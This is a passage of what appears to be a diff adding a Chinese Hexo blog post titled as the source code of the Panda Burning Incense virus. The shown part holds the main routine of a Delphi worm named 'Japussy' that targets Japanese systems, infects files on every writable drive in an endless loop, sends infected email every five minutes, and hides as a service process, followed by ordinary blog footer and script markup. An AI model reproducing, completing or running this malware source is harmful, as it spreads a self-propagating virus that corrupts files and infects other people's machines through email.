class="line">begin</span><br><span class="line">if GetACP = 932 then //日文操作系统</span><br><span class="line">IsJap := True; //去死吧！</span><br><span class="line">DriverList := GetDrives; //得到可写的磁盘列表</span><br><span class="line">Len := Length(DriverList);</span><br><span class="line">while True do //死循环</span><br><span class="line">begin</span><br><span class="line">for i := Len downto 1 do //遍历每个磁盘驱动器</span><br><span class="line">LoopFiles(DriverList + &apos;:&apos;, &apos;*.*&apos;); //感染之</span><br><span class="line">SendMail; //发带毒邮件</span><br><span class="line">Sleep(1000 * 60 * 5); //睡眠5分钟</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 主程序开始 &#125;</span><br><span class="line">begin</span><br><span class="line">if IsWin9x then //是Win9x</span><br><span class="line">RegisterServiceProcess(GetCurrentProcessID, 1) //注册为服务进程</span><br><span class="line">else //WinNT</span><br><span class="line">begin</span><br><span class="line">//远程线程映射到Explorer进程</span><br><span class="line">//哪位兄台愿意完成之？</span><br><span class="line">end;</span><br><span class="line">//如果是原始病毒体自己</span><br><span class="line">if CompareText(ExtractFileName(ParamStr(0)), &apos;Japussy.exe&apos;) = 0 then</span><br><span class="line">InfectFiles //感染和发邮件</span><br><span class="line">else //已寄生于宿主程序上了，开始工作</span><br><span class="line">begin</span><br><span class="line">TmpFile := ParamStr(0); //创建临时文件</span><br><span class="line">Delete(TmpFile, Length(TmpFile) - 4, 4);</span><br><span class="line">TmpFile := TmpFile + #32 + &apos;.exe&apos;; //真正的宿主文件，多一个空格</span><br><span class="line">ExtractFile(TmpFile); //分离之</span><br><span class="line">FillStartupInfo(Si, SW_SHOWDEFAULT);</span><br><span class="line">CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,</span><br><span class="line">0, nil, &apos;.&apos;, Si, Pi); //创建新进程运行之</span><br><span class="line">InfectFiles; //感染和发邮件</span><br><span class="line">end;</span><br><span class="line">end.</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        
+      </div>
+    
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/05/80% 应聘者都不及格的 JS 面试题/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/05/佛祖保佑,代码神兽/" rel="prev" title="">
+                 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Chen</p>
+              <p class="site-description motion-element" itemprop="description">Chen</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#熊猫烧香源码"><span class="nav-number">1.</span> <span class="nav-text">熊猫烧香源码</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Chen</span>
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+-->
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+    <script type="text/javascript" color="0,0,255" opacity='0.4' zIndex="-2" count="40" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
